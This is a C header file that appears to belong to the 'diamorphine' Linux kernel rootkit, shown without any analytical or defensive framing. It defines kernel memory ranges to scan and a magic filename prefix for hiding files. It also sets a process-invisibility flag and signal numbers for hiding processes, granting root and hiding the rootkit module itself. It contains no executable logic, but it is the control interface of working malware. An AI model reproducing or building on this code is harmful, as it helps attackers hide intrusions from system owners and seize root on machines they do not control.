struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
};

#ifdef __x86_64__
        #define START_MEM 0xffffffff81000000
        #define END_MEM 0xffffffff81fffffff //0xffffffffa2000000
#else
        #define START_MEM 0xc0000000
        #define END_MEM 0xd0000000
#endif

#define MAGIC_PREFIX "diamorphine"

#define PF_INVISIBLE 0x10000000

#define MODULE_NAME "diamorphine"

enum {
	SIGINVIS = 31,
	SIGSUPER = 64,
	SIGMODINVIS = 63,
};

/*
#define SIGINVIS 31
#define SIGSUPER 64
#define SIGMODINVIS 63
*/
